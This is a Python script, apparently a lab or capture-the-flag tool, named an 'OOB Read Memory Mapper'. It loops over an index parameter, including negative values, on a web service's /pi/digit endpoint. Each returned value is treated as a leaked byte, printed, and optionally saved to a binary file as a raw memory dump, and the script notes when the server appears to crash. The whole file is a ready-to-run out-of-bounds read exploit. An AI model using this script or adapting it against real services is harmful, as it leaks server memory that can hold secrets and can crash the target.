import requests
import argparse
import sys

def map_memory(url, start_n, end_n, output_file=None):
    base_url = "{}/pi/digit".format(url)
    
    print("[*] Mapping memory from n={} to n={}...".format(start_n, end_n))
    header = "{:>10} | {:>10} | {:>10}".format("n value", "Byte (Hex)", "Byte (Dec)")
    print(header)
    print("-" * len(header))

    # Open file in 'wb' (write binary) mode if requested
    f = open(output_file, "wb") if output_file else None

    try:
        for n in range(start_n, end_n + 1):
            try:
                payload = {'n': n}
                response = requests.get(base_url, params=payload, timeout=2)
                
                if response.status_code == 200:
                    data = response.json()
                    digit = data.get('digit', 0)
                    
                    # Console output
                    print("{:10d} |       0x{:02x} | {:10d}".format(n, digit, digit))
                    
                    # File output (raw byte)
                    if f:
                        # In Python 3, we must convert the int to a bytes object
                        f.write(bytes([digit]))
                else:
                    print("{:10d} | [!] Status Code: {}".format(n, response.status_code))
                    
            except requests.exceptions.RequestException:
                print("\n[!] Connection lost at n={}. Server likely crashed.".format(n))
                break
    finally:
        if f:
            f.close()
            print("\n[+] Raw memory dump saved to: {}".format(output_file))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OOB Read Memory Mapper")
    parser.add_argument("--url", default="http://localhost:8080", help="Base URL")
    parser.add_argument("--low", type=int, required=True, help="Lower bound (e.g. -20)")
    parser.add_argument("--high", type=int, required=True, help="Upper bound (e.g. 100)")
    parser.add_argument("--output", help="Filename to save raw bytes to (e.g. dump.bin)")
    
    args = parser.parse_args()
    map_memory(args.url, args.low, args.high, args.output)
